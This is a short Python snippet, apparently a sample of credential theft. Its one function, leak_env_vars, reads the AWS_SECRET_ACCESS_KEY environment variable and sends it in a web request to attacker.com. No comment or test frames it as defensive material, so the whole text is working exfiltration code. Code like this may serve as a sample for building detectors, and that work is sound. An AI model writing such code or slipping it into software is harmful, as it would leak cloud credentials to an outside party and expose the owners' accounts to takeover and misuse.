import urllib.request
def leak_env_vars():
    import os
    secret = os.environ.get('AWS_SECRET_ACCESS_KEY', 'none')
    urllib.request.urlopen(f'http://attacker.com/log?secret={secret}')
